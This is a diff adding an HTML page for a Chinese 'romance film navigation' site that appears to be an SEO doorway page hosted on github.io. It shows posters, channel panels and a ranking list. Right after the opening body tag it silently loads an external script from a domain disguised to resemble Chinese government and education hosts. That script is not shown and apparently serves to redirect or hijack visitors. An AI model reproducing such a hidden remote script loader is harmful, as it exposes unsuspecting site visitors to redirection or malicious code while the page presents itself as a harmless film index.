@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="爱情电影网,先锋影音,aiqingdianyingwang,爱情片导航,浪漫电影,先锋播放">
+<meta name="description" content="爱情电影网先锋影音 - 专注浪漫爱情影视导航，汇集甜蜜爱情片、心动剧集与经典浪漫佳作，分类清晰、检索便捷，为每一位影视爱好者打造一站式的浪漫观影索引平台。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>爱情电影网先锋影音 | 浪漫影视导航 · 先锋之选</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--plum:#7c1d4a;--rose:#e11d74;--pink:#f43f8e;--mist:#fff0f6;--ink:#27101f;--txt:#6b4559;--dim:#b5839c;--gold:#f59e0b}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#fffdfe;color:var(--ink);line-height:1.65;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px}
+section{padding:52px 0}
+img{max-width:100%}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:70;background:rgba(255,253,254,.96);backdrop-filter:blur(10px);border-bottom:2px solid var(--mist)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;align-items:center;gap:12px}
+.badge{width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--plum),var(--pink));color:#fff;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:900;box-shadow:0 4px 12px rgba(244,63,142,.35);position:relative}
+.badge::after{content:"";position:absolute;inset:-5px;border:2px solid var(--rose);border-radius:50%;opacity:.4}
+.brand b{font-size:16px;font-weight:900;letter-spacing:.5px}
+.brand small{display:block;font-size:8.5px;color:var(--dim);letter-spacing:2px;text-transform:uppercase}
+nav{display:none;gap:6px}
+nav a{padding:10px 16px;border-radius:22px;font-size:13px;font-weight:800;color:var(--txt);transition:.25s}
+nav a:hover,nav a.on{color:#fff;background:linear-gradient(135deg,var(--plum),var(--pink))}
+.tog{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,var(--plum),var(--pink));color:#fff;border:none;font-size:15px;cursor:pointer}
+.drawer{display:none;background:#fff;border-bottom:2px solid var(--mist)}
+.drawer.on{display:block}
+.drawer a{display:block;padding:14px 16px;border-bottom:1px solid var(--mist);font-weight:800;font-size:14px}
+
+/* HERO */
+.hero{position:relative;background:linear-gradient(120deg,#5b1236 0%,#a11358 52%,#e11d74 100%);color:#fff;padding:76px 0;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 82% 18%,rgba(255,255,255,.22),transparent 40%),radial-gradient(circle at 12% 88%,rgba(245,158,11,.25),transparent 38%)}
+.hero::after{content:"♥";position:absolute;font-size:260px;color:rgba(255,255,255,.06);right:-30px;bottom:-80px;line-height:1}
+.hero .wrap{position:relative;z-index:2}
+.kicker{display:inline-block;background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.35);padding:6px 14px;border-radius:20px;font-size:11px;font-weight:800;letter-spacing:1px;margin-bottom:16px}
+.hero h1{font-size:30px;font-weight:900;line-height:1.3;margin-bottom:14px}
+.hero h1 em{font-style:normal;color:#fde047}
+.hero p{font-size:13px;color:#fbcfe8;max-width:600px;margin-bottom:24px}
+.search{display:flex;background:#fff;border-radius:30px;padding:6px;max-width:520px;box-shadow:0 12px 28px rgba(0,0,0,.2)}
+.search input{flex:1;border:none;outline:none;padding:11px 16px;font-size:13px;color:var(--ink);background:transparent}
+.search button{background:linear-gradient(135deg,var(--plum),var(--pink));color:#fff;border:none;padding:0 22px;border-radius:24px;font-size:13px;font-weight:900;cursor:pointer}
+.tags{margin-top:18px;display:flex;gap:8px;flex-wrap:wrap}
+.tags span{background:rgba(255,255,255,.16);border:1px dashed rgba(255,255,255,.4);color:#fff;font-size:11px;padding:5px 12px;border-radius:16px}
+
+/* SECTION TITLE */
+.stitle{display:flex;align-items:flex-end;justify-content:space-between;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.stitle .zh{font-size:22px;font-weight:900}
+.stitle .zh i{font-style:normal;color:var(--pink)}
+.stitle .ln{width:52px;height:5px;background:linear-gradient(90deg,var(--plum),var(--pink));border-radius:3px;margin-top:8px}
+.stitle .more{font-size:12px;color:var(--dim);font-weight:800}
+
+/* POSTER DOM A */
+.posters{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.poster{background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 4px 14px rgba(124,29,74,.1);transition:.28s;position:relative}
+.poster:hover{transform:translateY(-6px) rotate(-.6deg);box-shadow:0 18px 34px rgba(225,29,116,.2)}
+.poster .ph{height:150px;display:flex;align-items:center;justify-content:center;font-size:46px;color:#fff;position:relative}
+.poster .ph .fl{position:absolute;top:10px;left:10px;background:#fff;color:var(--plum);font-size:9px;font-weight:900;padding:4px 9px;border-radius:6px}
+.poster .ph .fx{position:absolute;top:10px;right:10px;background:var(--gold);color:#3a2200;font-size:9px;font-weight:900;padding:4px 9px;border-radius:6px}
+.poster .ph .sc{position:absolute;bottom:10px;right:10px;background:rgba(0,0,0,.55);color:#fff;font-size:9px;font-weight:800;padding:3px 8px;border-radius:5px}
+.poster .info{padding:11px}
+.poster .info b{font-size:13px;font-weight:900;display:block}
+.poster .info .sub{font-size:11px;color:var(--txt);margin-top:3px}
+
+/* DUAL PANEL DOM B */
+.panels{display:grid;grid-template-columns:1fr;gap:14px}
+.panel{background:#fff;border:1px solid var(--mist);border-radius:16px;padding:20px;display:flex;align-items:flex-start;gap:14px;transition:.25s}
+.panel:hover{background:var(--mist);transform:translateX(4px)}
+.panel .ic{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,var(--plum),var(--pink));color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.panel:nth-child(2) .ic{background:linear-gradient(135deg,#7c3aed,#a78bfa)}
+.panel:nth-child(3) .ic{background:linear-gradient(135deg,#be123c,#fb7185)}
+.panel:nth-child(4) .ic{background:linear-gradient(135deg,#9a3412,#fb923c)}
+.panel .tx b{font-size:14px;font-weight:900;display:block}
+.panel .tx p{font-size:12px;color:var(--txt);margin-top:3px}
+
+/* INDEX LIST DOM C */
+.list{background:#fff;border:1px solid var(--mist);border-radius:16px;overflow:hidden}
+.list .hd2{background:linear-gradient(135deg,var(--plum),var(--pink));color:#fff;padding:13px 18px;font-size:13px;font-weight:900}
+.list ul{list-style:none}
+.list li{display:flex;align-items:center;gap:12px;padding:13px 18px;border-bottom:1px dashed var(--mist)}
+.list li:last-child{border-bottom:none}
+.list li:hover{background:var(--mist)}
+.list .idx{width:26px;height:26px;border-radius:7px;background:var(--mist);color:var(--plum);font-size:11px;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.list li:nth-child(1) .idx,.list li:nth-child(2) .idx,.list li:nth-child(3) .idx{background:var(--rose);color:#fff}
+.list .nm{font-size:13px;font-weight:800;flex:1}
+.list .dot{font-size:10px;color:var(--pink);font-weight:800}
+
+footer{background:linear-gradient(135deg,#3d0a25,#7c1d4a);color:#fbcfe8;padding:46px 0 20px}
+.ft{display:grid;grid-template-columns:1fr;gap:24px}
+.ft .a b{font-size:15px;font-weight:900;color:#fff}
+.ft .a p{font-size:11.5px;margin-top:8px;color:#f9a8d4}
+.ft .a .u{color:#f9a8d4;font-size:11.5px;display:block;margin-top:10px;word-break:break-all}
+.cols{display:grid;grid-template-columns:repeat(2,1fr);gap:9px}
+.cols a{font-size:12px;color:#f9a8d4;transition:.2s}
+.cols a:hover{color:#fff}
+.cp{margin-top:26px;padding-top:14px;border-top:1px solid rgba(249,168,212,.22);font-size:10px;line-height:1.95;color:#db2777}
+
+#top{position:fixed;right:14px;bottom:18px;z-index:90;width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--plum),var(--pink));color:#fff;font-size:16px;display:none;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 6px 16px rgba(225,29,116,.35)}
+#top.on{display:flex}
+
+@media(min-width:620px){.posters{grid-template-columns:repeat(3,1fr)}.hero h1{font-size:38px}.panels{grid-template-columns:1fr 1fr}.list li{padding:15px 22px}}
+@media(min-width:820px){
+ nav{display:flex}.tog{display:none}
+ .hero h1{font-size:48px;max-width:860px}
+ .hero p{font-size:15px}
+ .posters{grid-template-columns:repeat(6,1fr)}
+ .panels{grid-template-columns:repeat(4,1fr)}
+ .ft{grid-template-columns:1.6fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="brand"><div class="badge">♥</div><div><b>爱情电影网先锋影音</b><small>Pioneer AV · Romance</small></div></div>
+    <nav>
+      <a href="#home" class="on">首页</a>
+      <a href="#new">最新上架</a>
+      <a href="#ch">频道导航</a>
+      <a href="#rank">先锋榜单</a>
+    </nav>
+    <button class="tog" onclick="document.getElementById('dr').classList.toggle('on')">☰</button>
+  </div>
+  <div class="drawer" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#new" onclick="this.parentNode.classList.remove('on')">最新上架</a>
+    <a href="#ch" onclick="this.parentNode.classList.remove('on')">频道导航</a>
+    <a href="#rank" onclick="this.parentNode.classList.remove('on')">先锋榜单</a>
+  </div>
+</header>
+
+<main>
+
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="kicker">♥ 先锋影音 · 浪漫之选</div>
+    <h1>专注爱情影视导航<br>做你追剧路上的<em>先锋</em></h1>
+    <p>爱情电影网先锋影音汇集甜蜜爱情片、心动剧集与经典浪漫佳作，分类清晰、检索便捷，为每一位影视爱好者打造一站式的浪漫观影索引平台。</p>
+    <div class="search"><input type="text" placeholder="搜索爱情片 / 演员 / 剧集..."><button>搜索</button></div>
+    <div class="tags"><span>#甜蜜爱情</span><span>#心动剧集</span><span>#经典浪漫</span><span>#高分榜单</span></div>
+  </div>
+</section>
+
+<!-- POSTERS DOM A -->
+<section id="new">
+  <div class="wrap">
+    <div class="stitle"><div><div class="zh">最新<i>上架</i></div><div class="ln"></div></div><a href="#" class="more">查看全部 →</a></div>
+    <div class="posters">
+      <a href="#" class="poster"><div class="ph" style="background:linear-gradient(135deg,#831843,#f43f8e)"><span class="fl">爱情</span><span class="fx">高清</span><span class="sc">2026</span>💕</div><div class="info"><b>初恋的轨迹</b><div class="sub">浪漫 / 青春 · 9.2</div></div></a>
+      <a href="#" class="poster"><div class="ph" style="background:linear-gradient(135deg,#4c1d95,#a78bfa)"><span class="fl">剧情</span><span class="fx">热播</span><span class="sc">2026</span>🌹</div><div class="info"><b>约定一生</b><div class="sub">都市 / 爱情 · 9.0</div></div></a>
+      <a href="#" class="poster"><div class="ph" style="background:linear-gradient(135deg,#9a3412,#fb923c)"><span class="fl">喜剧</span><span class="fx">推荐</span><span class="sc">2026</span>💑</div><div class="info"><b>相亲这件小事</b><div class="sub">喜剧 / 爱情 · 8.6</div></div></a>
+      <a href="#" class="poster"><div class="ph" style="background:linear-gradient(135deg,#0e7490,#22d3ee)"><span class="fl">治愈</span><span class="fx">高清</span><span class="sc">2026</span>🌷</div><div class="info"><b>海边来信</b><div class="sub">治愈 / 文艺 · 8.8</div></div></a>
+      <a href="#" class="poster"><div class="ph" style="background:linear-gradient(135deg,#166534,#4ade80)"><span class="fl">校园</span><span class="fx">热播</span><span class="sc">2026</span>💌</div><div class="info"><b>青春备忘录</b><div class="sub">校园 / 青春 · 8.5</div></div></a>
+      <a href="#" class="poster"><div class="ph" style="background:linear-gradient(135deg,#7c1d4a,#e11d74)"><span class="fl">经典</span><span class="fx">重温</span><span class="sc">经典</span>🎞️</div><div class="info"><b>时光情书</b><div class="sub">经典 / 爱情 · 9.4</div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- DUAL PANEL DOM B -->
+<section id="ch" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle"><div><div class="zh">频道<i>导航</i></div><div class="ln"></div></div></div>
+    <div class="panels">
+      <a href="#" class="panel"><span class="ic">💕</span><span class="tx"><b>甜蜜爱情</b><p>甜蜜恋爱片、都市浪漫剧一网打尽</p></span></a>
+      <a href="#" class="panel"><span class="ic">💒</span><span class="tx"><b>心动婚礼</b><p>婚礼、求婚与幸福时刻精选</p></span></a>
+      <a href="#" class="panel"><span class="ic">🌹</span><span class="tx"><b>经典重温</b><p>高分经典爱情片索引合集</p></span></a>
+      <a href="#" class="panel"><span class="ic">🎶</span><span class="tx"><b>青春校园</b><p>校园、青春与成长故事</p></span></a>
+    </div>
+  </div>
+</section>
+
+<!-- INDEX LIST DOM C -->
+<section id="rank" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle"><div><div class="zh">先锋<i>榜单</i></div><div class="ln"></div></div><a href="#" class="more">完整榜单 →</a></div>
+    <div class="list">
+      <div class="hd2">🏆 先锋影音 · 热门排行榜</div>
+      <ul>
+        <li><span class="idx">1</span><span class="nm">初恋的轨迹</span><span class="dot">爱情 · 9.2</span></li>
+        <li><span class="idx">2</span><span class="nm">约定一生</span><span class="dot">都市 · 9.0</span></li>
+        <li><span class="idx">3</span><span class="nm">时光情书</span><span class="dot">经典 · 9.4</span></li>
+        <li><span class="idx">4</span><span class="nm">海边来信</span><span class="dot">治愈 · 8.8</span></li>
+        <li><span class="idx">5</span><span class="nm">相亲这件小事</span><span class="dot">喜剧 · 8.6</span></li>
+        <li><span class="idx">6</span><span class="nm">青春备忘录</span><span class="dot">校园 · 8.5</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="a">
+        <b>爱情电影网先锋影音</b>
+        <p>专注爱情影视导航，汇集甜蜜爱情片、心动剧集与经典浪漫佳作，分类清晰、检索便捷，为每一位影视爱好者打造一站式的浪漫观影索引平台。</p>
+        <span class="u">https://aiqingdianyingwangxianfengyingyin-wap.github.io</span>
+      </div>
+      <div>
+        <div class="cols">
+          <a href="#">首页</a><a href="#">最新上架</a>
+          <a href="#">频道导航</a><a href="#">先锋榜单</a>
+          <a href="#">经典重温</a><a href="#">关于本站</a>
+        </div>
+      </div>
+    </div>
+    <div class="cp">© 2026 爱情电影网先锋影音 · 保留所有权利<br>本站为影视信息导航平台，内容仅供索引参考，倡导正版观看，相关影视版权归出品方及原作者所有</div>
+  </div>
+</footer>
+
+<div id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('top').classList.toggle('on',window.scrollY>450);});
+</script>
+</body>
+</html>
